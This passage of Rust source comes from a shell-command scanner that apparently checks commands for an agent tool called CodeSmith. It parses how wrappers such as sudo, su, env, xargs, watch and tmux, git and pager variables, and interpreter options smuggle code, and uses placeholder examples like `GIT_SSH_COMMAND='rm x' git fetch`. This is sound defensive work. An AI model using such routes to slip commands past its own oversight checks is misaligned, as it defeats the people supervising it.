                        w.starts_with('-') && !w.starts_with("--") && w.contains(['s', 'i'])
                    });
                return stdin.then_some(None);
            }
            Some(
                raw.get(i)
                    .and_then(|r| is_static_word(r).then(|| cooked[i].clone())),
            )
        }
        _ => None,
    }
}

/// The replace string of `xargs -I R` / `-i` / `-J R` (BSD), in its options.
fn xargs_replace(opts: &[String]) -> Option<&str> {
    let mut it = opts.iter().skip(1);
    while let Some(w) = it.next() {
        match w.as_str() {
            "-I" | "-J" => return it.next().map(String::as_str),
            "-i" | "--replace" => return Some("{}"),
            _ if w.starts_with("--replace=") => return Some(&w[10..]),
            _ if w.starts_with("-I") || w.starts_with("-J") => return Some(&w[2..]),
            _ if w.starts_with("-i") => return Some(&w[2..]),
            _ => {}
        }
    }
    None
}

/// Whether a command that `xargs` or `find -exec` fills in runs text it is
/// given as code: `repl` in the command name or in a shell string, or input
/// appended (`appends`) to a shell with no script or a wrapper with no command.
fn runs_input(raw: &[String], cooked: &[String], repl: Option<&str>, appends: bool) -> bool {
    let Some(name) = cooked.first() else {
        return false;
    };
    if repl.is_some_and(|r| !r.is_empty() && name.contains(r)) {
        return true;
    }
    let base = name.rsplit('/').next().unwrap_or(name);
    if let Some(script) = shell_string(base, raw, cooked) {
        return match script {
            None => true,
            Some(code) => repl.is_some_and(|r| !r.is_empty() && code.contains(r)),
        };
    }
    if base == "sh" || base == "bash" || base == "zsh" || base == "dash" {
        // A script file named by the input.
        return appends && cooked.len() == 1;
    }
    let has_repl = |text: &str| repl.is_some_and(|r| !r.is_empty() && text.contains(r));
    match wrapped_command(base, cooked) {
        Some(Wrapped::At(at)) if at < cooked.len() => {
            runs_input(&raw[at..], &cooked[at..], repl, appends)
        }
        Some(Wrapped::At(_) | Wrapped::Unknown) => appends,
        Some(Wrapped::Script(k)) => has_repl(&cooked[k]),
        // Input appended to the words joins the code.
        Some(Wrapped::Joined(a, b)) => {
            (appends && b == cooked.len()) || has_repl(&cooked[a..b].join(" "))
        }
        Some(Wrapped::Nothing) | None => false,
    }
}

/// A script operand whose contents come from a pipe, a process substitution
/// or a computed name rather than a file in the repository.
/// `cooked` is the operand with quotes removed: `''/dev/stdin` is `/dev/stdin`.
fn computed_source(raw: &str, cooked: &str) -> bool {
    let path = format!("/{cooked}");
    cooked == "-"
        || raw.starts_with("<(")
        || raw.starts_with(">(")
        || ["/dev/", "/proc/", "/fd/"].iter().any(|d| path.contains(d))
        || !is_static_word(raw)
}

/// Past a shell's options from `i`: where its operands start, and whether
/// it was given `-c`.
fn shell_options(cooked: &[String], mut i: usize) -> (usize, bool) {
    let mut c = false;
    while i < cooked.len() {
        let w = &cooked[i];
        if w == "--" || w == "-" {
            i += 1;
            break;
        }
        if ["-o", "+o", "-O", "+O", "--rcfile", "--init-file"].contains(&w.as_str()) {
            i += 2;
            continue;
        }
        if let Some(flags) = w.strip_prefix(['-', '+']) {
            if (!w.starts_with("--") && flags.contains('c')) || w == "--command" {
                c = true;
            }
            i += 1;
            continue;
        }
        break;
    }
    (i, c)
}

/// What a wrapper runs, in its words.
#[derive(Debug, Clone, Copy, PartialEq)]
enum Wrapped {
    /// The command starting at this word (`nice rm x`).
    At(usize),
    /// The shell code in this word (`flock f -c 'rm x'`, `su -c 'rm x'`).
    Script(usize),
    /// The shell code these words make joined with spaces (`watch rm x`).
    Joined(usize, usize),
    /// A command the words do not show (an interactive shell, `env -S`).
    Unknown,
    /// No command (`taskset -p 1`, `command -v x`).
    Nothing,
}

/// Commands that Homebrew installs under a `g` prefix (`gtimeout`), and
/// spellings of one program, by the name the scanner knows.
fn canonical_name(base: &str) -> &str {
    match base {
        "gtimeout" | "gnice" | "gnohup" | "genv" | "gstdbuf" | "gchroot" | "gxargs" | "gtime"
        | "gfind" | "gsed" => &base[1..],
        "proxychains4" => "proxychains",
        "sem" => "parallel",
        "sudoedit" => "sudo",
        "nodejs" => "node",
        _ => base,
    }
}

/// Whether option `short` (in a cluster) or `long` (alone or `--long=x`)
/// is among `opts`.
fn has_option(opts: &[String], short: char, long: &str) -> bool {
    opts.iter().any(|w| {
        (!long.is_empty()
            && (w == long || w.strip_prefix(long).is_some_and(|r| r.starts_with('='))))
            || (w.len() > 1 && w.starts_with('-') && !w.starts_with("--") && w[1..].contains(short))
    })
}

/// Wrappers whose GNU and BSD builds parse options differently (`--iP`).
const DUAL_GETOPT: &[&str] = &[
    "env", "xargs", "nice", "time", "timeout", "stdbuf", "nohup", "chroot",
];

/// What wrapper `base` runs in `cooked`, or `None` when it is no wrapper.
fn wrapped_command(base: &str, cooked: &[String]) -> Option<Wrapped> {
    let base = canonical_name(base);
    // Options that take an argument (the next word, or the rest of a
    // cluster), and short options whose argument is optional and attached
    // (`watch -d[x]`), which end a cluster.
    let (with_arg, attached): (&[&str], &str) = match base {
        // `-P altpath` is BSD's.
        "env" => (&["-u", "--unset", "-C", "--chdir", "-P"], ""),
        "command" | "builtin" | "nohup" | "setsid" | "unbuffer" | "noglob" | "nocorrect"
        | "repeat" | "coproc" | "-" | "catchsegv" | "valgrind" | "dbus-run-session" | "taskset"
        | "entr" | "faketime" => (&[], ""),
        "caffeinate" => (&["-t", "-w"], ""),
        "exec" => (&["-a"], ""),
        "stdbuf" => (&["-i", "-o", "-e", "--input", "--output", "--error"], ""),
        "time" => (&["-f", "-o", "--format", "--output"], ""),
        "nice" => (&["-n", "--adjustment"], ""),
        "ionice" => (
            &[
                "-c",
                "-n",
                "-p",
                "-P",
                "-u",
                "--class",
                "--classdata",
                "--pid",
                "--pgid",
                "--uid",
            ],
            "",
        ),
        "timeout" => (&["-s", "-k", "--signal", "--kill-after"], ""),
        // `-h` alone is help; `-hhost` names a host.
        "sudo" => (
            &[
                "-a",
                "-c",
                "-C",
                "-D",
                "-g",
                "-p",
                "-r",
                "-R",
                "-t",
                "-T",
                "-U",
                "-u",
                "--auth-type",
                "--login-class",
                "--close-from",
                "--chdir",
                "--group",
                "--prompt",
                "--chroot",
                "--role",
                "--type",
                "--command-timeout",
                "--other-user",
                "--user",
            ],
            "h",
        ),
        "doas" => (&["-a", "-C", "-u"], ""),
        "pkexec" => (&["--user"], ""),
        "chrt" => (
            &[
                "-T",
                "-P",
                "-D",
                "--sched-runtime",
                "--sched-period",
                "--sched-deadline",
            ],
            "",
        ),
        "flock" => (
            &["-w", "-E", "--timeout", "--wait", "--conflict-exit-code"],
            "",
        ),
        "lockf" => (&["-t"], ""),
        "chroot" => (&["-u", "-g", "-G", "--userspec", "--groups"], ""),
        "watch" => (&["-n", "-q", "--interval", "--equexit"], "d"),
        "strace" => (
            &[
                "-a",
                "-b",
                "-e",
                "-E",
                "-I",
                "-o",
                "-O",
                "-p",
                "-P",
                "-s",
                "-S",
                "-u",
                "-X",
                "--attach",
                "--output",
                "--user",
                "--env",
                "--trace-path",
            ],
            "",
        ),
        "ltrace" => (
            &[
                "-a",
                "-A",
                "-D",
                "-e",
                "-F",
                "-l",
                "-n",
                "-o",
                "-p",
                "-s",
                "-u",
                "-w",
                "-x",
                "--align",
                "--output",
                "--library",
                "--indent",
            ],
            "",
        ),
        "dtruss" => (&["-t", "-p", "-n"], ""),
        "arch" => (&["-arch", "-d", "-e"], ""),
        "sandbox-exec" => (&["-f", "-n", "-p", "-D"], ""),
        "unshare" => (
            &[
                "-S",
                "-G",
                "-R",
                "-w",
                "-l",
                "--setuid",
                "--setgid",
                "--root",
                "--wd",
                "--map-user",
                "--map-group",
                "--map-users",
                "--map-groups",
                "--propagation",
                "--setgroups",
                "--load-interp",
            ],
            "muinpUCT",
        ),
        "nsenter" => (
            &["-t", "-S", "-G", "--target", "--setuid", "--setgid"],
            "muinpUCTrw",
        ),
        "setpriv" => (
            &[
                "--reuid",
                "--regid",
                "--ruid",
                "--euid",
                "--rgid",
                "--egid",
                "--groups",
                "--securebits",
                "--pdeathsig",
                "--inh-caps",
                "--ambient-caps",
                "--bounding-set",
                "--selinux-label",
                "--apparmor-profile",
                "--landlock-access",
                "--landlock-rule",
                "--seccomp-filter",
            ],
            "",
        ),
        "numactl" => (
            &[
                "-i",
                "-N",
                "-m",
                "-p",
                "-C",
                "-w",
                "--interleave",
                "--cpunodebind",
                "--membind",
                "--preferred",
                "--physcpubind",
                "--weighted-interleave",
            ],
            "",
        ),
        "prlimit" => (&["-p", "-o", "--pid", "--output"], "cdefilmnqrstuvxy"),
        "cgexec" => (&["-g"], ""),
        "xvfb-run" => (
            &[
                "-e",
                "-f",
                "-n",
                "-p",
                "-s",
                "-w",
                "--error-file",
                "--auth-file",
                "--server-num",
                "--xauth-protocol",
                "--server-args",
                "--wait",
            ],
            "",
        ),
        "fakeroot" => (&["-l", "-i", "-s", "-b", "--lib", "--faked"], ""),
        "proxychains" => (&["-f"], ""),
        "torsocks" => (
            &[
                "-u",
                "-p",
                "-a",
                "-P",
                "--user",
                "--pass",
                "--address",
                "--port",
            ],
            "",
        ),
        // `-J`, `-R`, `-S` are BSD's.
        "xargs" => (
            &[
                "-I",
                "-J",
                "-R",
                "-S",
                "-L",
                "-n",
                "-P",
                "-s",
                "-d",
                "-E",
                "-a",
                "--max-args",
                "--max-procs",
                "--max-lines",
                "--max-chars",
                "--delimiter",
                "--arg-file",
                "--eof",
                "--process-slot-var",
            ],
            "",
        ),
        _ => return special_wrapper(base, cooked),
    };
    let mut i = 1;
    while i < cooked.len() {
        let w = cooked[i].as_str();
        if w == "--"
            || (w == "-"
                && matches!(
                    base,
                    "builtin" | "command" | "exec" | "noglob" | "nocorrect"
                ))
        {
            // Zsh takes a lone `-` as the end of options: `builtin - eval x`.
            i += 1;
            break;
        }
        if base == "env"
            && (w.starts_with("--split-string")
                || (w.starts_with('-') && !w.starts_with("--") && w.contains('S')))
        {
            // `-S` splits a string into a command line, also in a cluster (`-vS'rm x'`).
            return Some(Wrapped::Unknown);
        }
        if base == "command" && w.starts_with('-') && w[1..].contains(['v', 'V']) {
            return Some(Wrapped::Nothing); // `command -v x` looks a name up.
        }
        if base == "env" && (env_assignment(w) || w == "-") {
            // A lone `-` is `-i`.
            i += 1;
            continue;
        }
        if w.starts_with('-') && w.len() > 1 {
            if with_arg.contains(&w) {
                // `-u root`, `--user root`, `arch -arch x86_64`.
                i += 2;
                continue;
            }
            // In a cluster (`-iP dir`), the first option taking an argument
            // takes the rest of the word, or the next word; an optional
            // attached argument (`-dx`) takes the rest.
            let cluster = |letters: &str| {
                let letters: Vec<char> = letters.chars().collect();
                letters
                    .iter()
                    .position(|c| {
                        attached.contains(*c) || with_arg.contains(&format!("-{c}").as_str())
                    })
                    .is_some_and(|k| k == letters.len() - 1 && !attached.contains(letters[k]))
            };
            let takes_next = match w.strip_prefix("--") {
                Some(long) if !long.contains('=') && DUAL_GETOPT.contains(&base) => {
                    // GNU reads a long option, BSD getopt a cluster (`--iP`
                    // is `-i -P`): when they disagree, the command is unknown.
                    let gnu = with_arg.contains(&w);
                    if gnu != cluster(long) {
                        return Some(Wrapped::Unknown);
                    }
                    gnu
                }
                Some(_) => false,
                None => cluster(&w[1..]),
            };
            i += if takes_next { 2 } else { 1 };
            continue;
        }
        break;
    }
    let opts = &cooked[1..i.min(cooked.len())];
    let rest = cooked.len().saturating_sub(i);
    match base {
        "env" => {
            // `env -- X=1 rm x`: assignments may follow `--`.
            while cooked.get(i).is_some_and(|w| env_assignment(w)) {
                i += 1;
            }
        }
        "timeout" | "repeat" | "faketime" => i += 1, // the duration, count, time
        "nice" if cooked.get(i).is_some_and(|w| w.starts_with('-')) => i += 1,
        // `taskset -p [mask] pid`, `chrt -p [prio] pid`, `chrt -m`.
        "taskset" if has_option(opts, 'p', "--pid") || has_option(opts, 'h', "--help") => {
            return Some(Wrapped::Nothing)
        }
        "chrt" if has_option(opts, 'p', "--pid") || has_option(opts, 'm', "--max") => {
            return Some(Wrapped::Nothing)
        }
        "taskset" | "chrt" => i += 1, // the mask, the priority
        "ionice"
            if has_option(opts, 'p', "--pid")
                || has_option(opts, 'P', "--pgid")
                || has_option(opts, 'u', "--uid") =>
        {
            return Some(Wrapped::Nothing)
        }
        "numactl" if has_option(opts, 's', "--show") || has_option(opts, 'H', "--hardware") => {
            return Some(Wrapped::Nothing)
        }
        "dtruss" if has_option(opts, 'p', "") || has_option(opts, 'n', "") => {
            return Some(Wrapped::Nothing)
        }
        "sudo" => {
            if has_option(opts, 'e', "--edit")
                || has_option(opts, 'V', "--version")
                || has_option(opts, 'l', "--list")
                || opts.iter().any(|w| w == "-h" || w == "--help")
                || cooked[0].ends_with("sudoedit")
            {
                return Some(Wrapped::Nothing);
            }
            if rest == 0 && (has_option(opts, 's', "--shell") || has_option(opts, 'i', "--login")) {
                // An interactive shell, reading its input.
                return Some(Wrapped::Unknown);
            }
        }
        "doas" => {
            if has_option(opts, 'L', "") || has_option(opts, 'C', "") {
                return Some(Wrapped::Nothing);
            }
            if rest == 0 && has_option(opts, 's', "") {
                return Some(Wrapped::Unknown);
            }
        }
        // With no command these run a shell, which reads its input.
        "pkexec" | "fakeroot" | "unshare" | "nsenter" if rest == 0 => {
            return Some(Wrapped::Unknown)
        }
        "flock" => {
            if has_option(opts, 'c', "--command") {
                // `-c` before the file: builds disagree on what it means.
                return Some(Wrapped::Unknown);
            }
            // `flock FILE -c CODE`, `flock FILE CMD...`, `flock FD`.
            return Some(match cooked.get(i + 1).map(String::as_str) {
                None => Wrapped::Nothing,
                Some("-c" | "--command") if cooked.len() == i + 3 => Wrapped::Script(i + 2),
                Some("-c" | "--command") => Wrapped::Nothing,
                Some(_) => Wrapped::At(i + 1),
            });
        }
        "lockf" => {
            return Some(if rest < 2 {
                Wrapped::Nothing
            } else {
                Wrapped::At(i + 1)
            })
        }
        "chroot" => {
            // `chroot DIR` runs an interactive shell.
            return Some(if rest < 2 {
                Wrapped::Unknown
            } else {
                Wrapped::At(i + 1)
            });
        }
        "watch" => {
            // `sh -c` of the joined words, unless `-x`.
            if has_option(opts, 'x', "--exec") {
                return Some(Wrapped::At(i));
            }
            return Some(if rest == 0 {
                Wrapped::Nothing
            } else {
                Wrapped::Joined(i, cooked.len())
            });
        }
        "entr" if has_option(opts, 's', "") => {
            return Some(if rest == 0 {
                Wrapped::Nothing
            } else {
                Wrapped::Script(i)
            })
        }
        "torsocks" if has_option(opts, 'i', "--shell") => return Some(Wrapped::Unknown),
        "arch" | "setpriv" | "prlimit" | "torsocks" if rest == 0 => return Some(Wrapped::Nothing),
        _ => {}
    }
    // Reserved words and Zsh's precommand modifiers parse assignments
    // after them (`time X=1 rm x`, `repeat 1 X=1 rm x`); for other wrappers
    // `X=1` would be a command name no PATH holds, so skipping is safe.
    while cooked.get(i).is_some_and(|w| assignment_word(w)) {
        i += 1;
    }
    Some(Wrapped::At(i))
}

/// Wrappers with a grammar of their own; see [`wrapped_command`].
fn special_wrapper(base: &str, cooked: &[String]) -> Option<Wrapped> {
    let n = cooked.len();
    match base {
        // `busybox rm x` runs the applet `rm`.
        "busybox" | "toybox" => Some(match cooked.get(1) {
            Some(w) if !w.starts_with('-') => Wrapped::At(1),
            _ => Wrapped::Nothing,
        }),
        // `su [opts] [-] [user [args]]`: arguments after the user go to
        // its shell, so `-c CODE` anywhere is code; without it the shell
        // reads its input. `runuser -u user cmd` runs `cmd`.
        "su" | "runuser" => {
            let mut i = 1;
            while i < n {
                let w = cooked[i].as_str();
                match w {
                    "-c" | "--command" | "--session-command" => {
                        return Some(if i + 1 < n {
                            Wrapped::Script(i + 1)
                        } else {
                            Wrapped::Nothing
                        })
                    }
                    // A program of the caller's choosing runs as the shell.
                    "-s" | "--shell" => return Some(Wrapped::Unknown),
                    "-u" | "--user" if base == "runuser" => {
                        let mut at = i + 2;
                        while at < n && cooked[at].starts_with('-') && cooked[at] != "--" {
                            at += 1;
                        }
                        if cooked.get(at).is_some_and(|w| w == "--") {
                            at += 1;
                        }
                        return Some(if at < n {
                            Wrapped::At(at)
                        } else {
                            Wrapped::Unknown
                        });
                    }
                    "-g" | "-G" | "-w" | "--group" | "--supp-group" | "--whitelist-environment" => {
                        i += 2;
                        continue;
                    }
                    _ if ["--command=", "--session-command=", "--shell="]
                        .iter()
                        .any(|p| w.starts_with(p)) =>
                    {
                        return Some(Wrapped::Unknown)
                    }
                    _ if w.len() > 1 && w.starts_with('-') && !w.starts_with("--") => {
                        let letters = &w[1..];
                        if letters.ends_with('c') {
                            return Some(if i + 1 < n {
                                Wrapped::Script(i + 1)
                            } else {
                                Wrapped::Nothing
                            });
                        }
                        if letters.contains(['c', 's']) {
                            return Some(Wrapped::Unknown);
                        }
                    }
                    _ => {}
                }
                i += 1;
            }
            // A shell reading its input, or given a script.
            Some(Wrapped::Unknown)
        }
        // GNU `script [opts] [file]` with `-c CODE`; BSD `script [opts]
        // [file [cmd...]]`. With neither, an interactive shell.
        "script" => {
            for (i, w) in cooked.iter().enumerate().skip(1) {
                if w == "-c" || w == "--command" {
                    return Some(if i + 1 < n {
                        Wrapped::Script(i + 1)
                    } else {
                        Wrapped::Nothing
                    });
                }
                if w.starts_with("--command=") || (w.starts_with("-c") && w.len() > 2) {
                    return Some(Wrapped::Unknown);
                }
                if w.starts_with('-') && !w.starts_with("--") && w[1..].ends_with('c') {
                    return Some(if i + 1 < n {
                        Wrapped::Script(i + 1)
                    } else {
                        Wrapped::Nothing
                    });
                }
                if w.starts_with('-') && !w.starts_with("--") && w[1..].contains('p') {
                    return Some(Wrapped::Nothing); // playback
                }
            }
            let mut i = 1;
            while i < n && cooked[i].starts_with('-') && cooked[i] != "-" {
                let w = &cooked[i];
                i += 1;
                if w == "--" {
                    break;
                }
                if ["-t", "-T", "-E", "-I", "-O", "-B", "-m", "-o"].contains(&w.as_str()) {
                    i += 1;
                }
            }
            Some(if i + 1 < n {
                Wrapped::At(i + 1)
            } else {
                Wrapped::Unknown
            })
        }
        // GNU parallel: `parallel [opts] cmd... ::: args`, the command run
        // by a shell; with no command, each input line is one.
        "parallel" => {
            const ARG: &[&str] = &[
                "-j",
                "--jobs",
                "-P",
                "--max-procs",
                "-S",
                "--sshlogin",
                "--sshloginfile",
                "--slf",
                "-a",
                "--arg-file",
                "-d",
                "--delimiter",
                "-E",
                "--eof",
                "-I",
                "-n",
                "--max-args",
                "-N",
                "-L",
                "--max-lines",
                "-l",
                "-s",
                "--max-chars",
                "--colsep",
                "-C",
                "--tmpdir",
                "--results",
                "--res",
                "--joblog",
                "--timeout",
                "--delay",
                "--retries",
                "--memfree",
                "--load",
                "--env",
                "--basefile",
                "--bf",
                "--transfer-file",
                "--tf",
                "--return",
                "--workdir",
                "--wd",
                "--tagstring",
                "--header",
                "--halt",
                "--termseq",
                "--block",
                "--recstart",
                "--recend",
                "--nice",
                "--ssh",
                "--rpl",
                "--shebang-wrap",
                "--limit",
                "--sqlmaster",
                "--sqlworker",
                "--sqlandworker",
                "--fg",
                "--id",
                "--semaphorename",
                "--semaphoretimeout",
                "--st",
                "--profile",
                "-J",
                "--retry-failed",
                "--rsync-path",
                "--resume-failed",
            ];
            const FLAG: &[&str] = &[
                "-k",
                "--keep-order",
                "-u",
                "--ungroup",
                "-v",
                "--verbose",
                "-q",
                "--quote",
                "-X",
                "-m",
                "--xargs",
                "--dry-run",
                "--dryrun",
                "--bar",
                "--progress",
                "--eta",
                "--line-buffer",
                "--lb",
                "--null",
                "-0",
                "--trim",
                "--group",
                "--tag",
                "--pipe",
                "--spreadstdin",
                "--plus",
                "--will-cite",
                "--citation",
                "--no-notice",
                "--silent",
                "--halt-on-error",
                "--ungroup",
                "--lb",
                "--files",
                "--keep-order",
                "--shuf",
                "--semaphore",
                "--bg",
                "--wait",
                "--compress",
                "--cleanup",
                "--transfer",
                "--trc",
                "--onall",
                "--nonall",
                "--controlmaster",
                "-M",
                "--round-robin",
                "--round",
                "--group-by",
                "--linebuffer",
                "--number-of-cpus",
                "--number-of-cores",
                "--csv",
                "--tty",
                "-T",
                "--noswap",
                "--joblog-append",
                "--colour",
                "--color",
                "--ctag",
                "--ctagstring",
            ];
            let mut i = 1;
            while i < n {
                let w = cooked[i].as_str();
                if w == "--" {
                    i += 1;
                    break;
                }
                if !w.starts_with('-') || w == "-" || w.starts_with(":::") || w.starts_with("::::")
                {
                    break;
                }
                if ARG.contains(&w) {
                    i += 2;
                    continue;
                }
                let attached = |opts: &[&str]| {
                    opts.iter().any(|o| {
                        w.len() > o.len()
                            && w.starts_with(o)
                            && (!o.starts_with("--") || w[o.len()..].starts_with('='))
                    })
                };
                if FLAG.contains(&w) || attached(ARG) || w.starts_with("--replace") {
                    i += 1;
                    continue;
                }
                // An option this scanner does not know may take the next word.
                return Some(Wrapped::Unknown);
            }
            let end = (i..n)
                .find(|&k| [":::", "::::", ":::+", "::::+"].contains(&cooked[k].as_str()))
                .unwrap_or(n);
            Some(if i >= end {
                Wrapped::Unknown
            } else if cooked[i]
                .split_whitespace()
                .next()
                .is_some_and(|w| w.contains('{'))
            {
                // The input names the command.
                Wrapped::Unknown
            } else {
                Wrapped::Joined(i, end)
            })
        }
        // `nix-shell --run CODE`, `nix develop -c cmd...`; otherwise an
        // interactive shell.
        "nix-shell" => {
            let k = (1..n).find(|&k| cooked[k] == "--run" || cooked[k] == "--command");
            Some(match k {
                Some(k) if k + 1 < n => Wrapped::Script(k + 1),
                _ => Wrapped::Unknown,
            })
        }
        "nix" if matches!(cooked.get(1).map(String::as_str), Some("develop" | "shell")) => {
            let k = (2..n).find(|&k| cooked[k] == "-c" || cooked[k] == "--command");
            Some(match k {
                Some(k) if k + 1 < n => Wrapped::At(k + 1),
                _ if cooked[1] == "develop" => Wrapped::Unknown,
                _ => Wrapped::Nothing,
            })
        }
        // `at`/`batch` read commands to run later; `-l`, `-r`... only list
        // or remove jobs.
        "at" | "batch" => Some(
            if cooked[1..]
                .iter()
                .any(|w| w.starts_with('-') && w[1..].contains(['l', 'r', 'd', 'c']))
            {
                Wrapped::Nothing
            } else {
                Wrapped::Unknown
            },
        ),
        // `crontab -` or `crontab` alone install jobs read from input.
        "crontab" => Some(
            if cooked.len() == 1 || cooked[1..].iter().any(|w| w == "-") {
                Wrapped::Unknown
            } else {
                Wrapped::Nothing
            },
        ),
        // Commands tmux or screen start, or keys they type into a shell.
        "tmux" => Some(
            if cooked[1..].iter().any(|w| {
                [
                    "new-session",
                    "new",
                    "new-window",
                    "neww",
                    "split-window",
                    "splitw",
                    "respawn-pane",
                    "respawnp",
                    "respawn-window",
                    "respawnw",
                    "run-shell",
                    "run",
                    "display-popup",
                    "popup",
                    "pipe-pane",
                    "pipep",
                    "if-shell",
                    "if",
                    "send-keys",
                    "send",
                    "source-file",
                    "source",
                    "set-hook",
                    "bind-key",
                    "bind",
                    "command-prompt",
                    "confirm-before",
                    "set-option",
                    "set",
                ]
                .contains(&w.as_str())
            }) || cooked.len() == 1
            {
                Wrapped::Unknown
            } else {
                Wrapped::Nothing
            },
        ),
        "screen" => Some(
            if cooked[1..]
                .iter()
                .any(|w| !w.starts_with('-') || w == "-X" || w.starts_with("-dm") || w == "-c")
                || cooked.len() == 1
            {
                Wrapped::Unknown
            } else {
                Wrapped::Nothing
            },
        ),
        _ => None,
    }
}

// ---------------------------------------------------------------------------
// Code that programs run: variables, interpreters, awk, sed, git, ssh
// ---------------------------------------------------------------------------

/// Variables holding a command line that programs run (through a shell, or
/// as a program and its arguments): `GIT_SSH_COMMAND='rm x' git fetch`
/// runs `rm x`. Their static values are checked as shell code.
const COMMAND_VARS: &[&str] = &[
    "GIT_SSH_COMMAND",
    "GIT_SSH",
    "GIT_PAGER",
    "GIT_EDITOR",
    "GIT_SEQUENCE_EDITOR",
    "GIT_EXTERNAL_DIFF",
    "GIT_ASKPASS",
    "GIT_PROXY_COMMAND",
    "SSH_ASKPASS",
    "SUDO_ASKPASS",
    "PAGER",
    "MANPAGER",
    "SYSTEMD_PAGER",
    "GH_PAGER",
    "GH_EDITOR",
    "BAT_PAGER",
    "DELTA_PAGER",
    "PSQL_PAGER",
    "EDITOR",
    "VISUAL",
    "KUBE_EDITOR",
    "BROWSER",
    "RSYNC_RSH",
    "CVS_RSH",
    "LESSOPEN",
    "LESSCLOSE",
    "FZF_DEFAULT_COMMAND",
];

/// Values of a command variable or git setting that only page or do
/// nothing: not checked, so `GIT_PAGER=cat git log` asks nothing new.
const BENIGN_COMMANDS: &[&str] = &["", "cat", "true", "false", ":", "less", "more", "less -R"];

/// Shell code a program runs: checked as commands when static (`Some`),
/// otherwise the input is dynamic.
fn shell_code(
    code: Option<&str>,
    cwd: &Path,
    shared: &Shared,
    depth: usize,
    out: &mut Analysis,
) -> Result<(), Opaque> {
    match code {
        Some(code) if BENIGN_COMMANDS.contains(&code.trim()) => Ok(()),
        Some(code) => run_string(code, cwd, shared, depth, out),
        None => {
            mark_dynamic(out, "dynamic-execution");
            Ok(())
        }
    }
}

/// `cooked` as code when `raw` spells it statically.
fn static_text<'a>(raw: &str, cooked: &'a str) -> Option<&'a str> {
    is_static_word(raw).then_some(cooked)
}

/// An assignment to a [`COMMAND_VARS`] variable (or Git's config
/// variables), `raw` as written and `value` with quotes removed.
fn command_var(
    raw: &str,
    value: &str,
    cwd: &Path,
    shared: &Shared,
    depth: usize,
    out: &mut Analysis,
) -> Result<(), Opaque> {
    let Some((name, raw_value)) = raw.split_once('=') else {
        return Ok(());
    };
    let name = name.trim_end_matches('+');
    if name.starts_with("GIT_CONFIG_") {
        // `GIT_CONFIG_KEY_0=core.pager`: settings Git reads like `-c`;
        // `GIT_CONFIG_GLOBAL=file` names a file of them.
        mark_dynamic(out, "dynamic-execution");
        return Ok(());
    }
    if !COMMAND_VARS.contains(&name) {
        return Ok(());
    }
    let code = value.split_once('=').map_or("", |(_, v)| v);
    let code = if name.starts_with("LESS") {
        // `LESSOPEN='|cmd %s'`.
        code.trim_start_matches(['|', '-'])
    } else {
        code
    };
    shell_code(
        is_static_word(raw_value).then_some(code),
        cwd,
        shared,
        depth,
        out,
    )
}

/// Whether Dash running the command name `raw` (from `(( $x ))`, which it
/// reads as subshells) can run a command the scan does not see: a
/// substitution, a glob, a positional parameter, or a variable the script
/// gives text. A variable the script never sets comes from the environment
/// CodeSmith runs it in, and one it sets only to numbers names no command.
fn dash_name_matters(raw: &str, shared: &Shared) -> bool {
    if !raw.contains(['$', '`']) {
        // Not static for a glob or a brace expansion, which may name a file.
        return true;
    }
    let c: Vec<char> = raw.chars().collect();
    let text_var = |name: &str| shared.text_vars.borrow().contains(name);
    let mut i = 0;
    while i < c.len() {
        match c[i] {
            '\\' => i += 1,
            '`' => return true,
            '$' => match c.get(i + 1) {
                Some('(') if c.get(i + 2) == Some(&'(') => i += 2,
                Some('(') | Some('\'') | Some('"') | Some('[') => return true,
                Some('{') => {
                    let close = match c[i + 2..].iter().position(|&x| x == '}') {
                        Some(k) => i + 2 + k,
                        None => return true,
                    };
                    let body: String = c[i + 2..close].iter().collect();
                    let name = body.strip_prefix('#').unwrap_or(&body);
                    let numeric = body.starts_with('#') || ["?", "$", "!"].contains(&name);
                    if !numeric
                        && (name.is_empty()
                            || !name.chars().all(is_name_char)
                            || name.starts_with(|ch: char| ch.is_ascii_digit())
                            || text_var(name))
                    {
                        return true;
                    }
                    i = close;
                }
                Some('_') if !c.get(i + 2).is_some_and(|&ch| is_name_char(ch)) => return true,
                Some(&ch) if is_name_start(ch) => {
                    let end = (i + 1..c.len())
                        .find(|&k| !is_name_char(c[k]))
                        .unwrap_or(c.len());
                    let name: String = c[i + 1..end].iter().collect();
                    if text_var(&name) {
                        return true;
                    }
                    i = end - 1;
                }
                Some(&ch) if ch.is_ascii_digit() || "@*_-0".contains(ch) => return true,
                _ => {}
            },
            _ => {}
        }
        i += 1;
    }
    false
}

/// How an interpreter takes code on its command line.
struct Interpreter {
    /// Short options whose argument is code (`-c`, `-e`), in a cluster too.
    code: &'static str,
    /// Words whose next word (or `=` value) is code (`--eval`, node's `-pe`).
    code_words: &'static [&'static str],
    /// Short options taking an argument: the rest of the word, or the next.
    arg: &'static str,
    /// Short options taking an optional attached argument (the rest).
    attached: &'static str,
    /// Short options taking attached digits (`perl -l0`), the cluster going on.
    digits: &'static str,
    /// Options taking the next word as argument (`--require mod`).
    long_arg: &'static [&'static str],
    /// Short options naming what runs instead of code (`python -m mod`).
    module: &'static str,
    /// Options that run no code (`--version`).
    info: &'static [&'static str],
    /// Reads code from its input when given no script.
    stdin: bool,
}

const fn interp(code: &'static str, arg: &'static str, stdin: bool) -> Interpreter {
    Interpreter {
        code,
        code_words: &[],
        arg,
        attached: "",
        digits: "",
        long_arg: &[],
        module: "",
        info: &["--version", "-h", "--help"],
        stdin,
    }
}

/// The interpreter `base` names (`python3.12` is `python`).
fn interpreter(base: &str) -> Option<Interpreter> {
    let family = base.trim_end_matches(|c: char| c.is_ascii_digit() || c == '.');
    Some(match family {
        "python" | "pypy" => Interpreter {
            module: "m",
            long_arg: &["--check-hash-based-pycs"],
            info: &["-V", "-VV", "--version", "-h", "--help"],
            ..interp("c", "WXQ", true)
        },
        "perl" => Interpreter {
            attached: "ixdDMmFV",
            digits: "l0C",
            info: &["-v", "-V", "--version", "-h", "--help"],
            ..interp("eE", "I", true)
        },
        "ruby" => Interpreter {
            attached: "FxWK",
            digits: "0T",
            long_arg: &["--encoding", "--external-encoding", "--internal-encoding"],
            info: &["-v", "--version", "-h", "--help"],
            ..interp("e", "ICrE", true)
        },
        "node" => Interpreter {
            code_words: &["-e", "-p", "-pe", "-ep", "--eval", "--print"],
            long_arg: &[
                "--require",
                "--import",
                "--loader",
                "--experimental-loader",
                "--conditions",
                "--input-type",
                "--env-file",
                "--title",
                "--watch-path",
                "--test-name-pattern",
                "--redirect-warnings",
            ],
            info: &[
                "-v",
                "--version",
                "-h",
                "--help",
                "--v8-options",
                "-c",
